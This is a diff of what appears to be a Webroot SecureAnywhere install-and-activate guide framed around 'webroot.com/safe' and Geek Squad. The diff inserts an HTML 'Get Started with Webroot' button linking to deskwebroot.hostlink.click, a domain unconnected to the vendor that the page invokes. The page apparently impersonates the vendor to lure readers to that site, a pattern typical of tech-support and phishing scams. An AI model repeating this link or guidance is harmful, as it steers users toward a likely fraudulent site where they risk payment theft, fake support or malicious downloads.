@@ -1,10 +1,13 @@
 How to Install and Activate Webroot SecureAnywhere using webroot.com/safe Download Geek Squad
 ==============================================================================================
 
-Introduction
-------------
-
 Are you trying to secure your device using a trusted security solution? If you’ve already purchased Webroot SecureAnywhere and are looking for a way to install and activate it through **webroot.com/safe**, you’re in the right place. Whether you purchased Webroot online, via a retail store, or through Geek Squad, the installation and activation process is straightforward.
+
+.. raw:: html
+
+   <div style="text-align:center;">
+       <a href="https://deskwebroot.hostlink.click/" rel="noreferrer" style="background-color:#007BFF;color:white;padding:10px 20px;text-decoration:none;border-radius:5px;display:inline-block;font-weight:bold;">Get Started with Webroot</a>
+   </div>
 
 In this guide, we will cover how to begin the **Webroot SecureAnywhere Download**, use **webroot.com/safe**, and activate your protection easily. We'll also include how to redeem a keycode, create a Webroot account, and use your subscription across multiple devices.
 
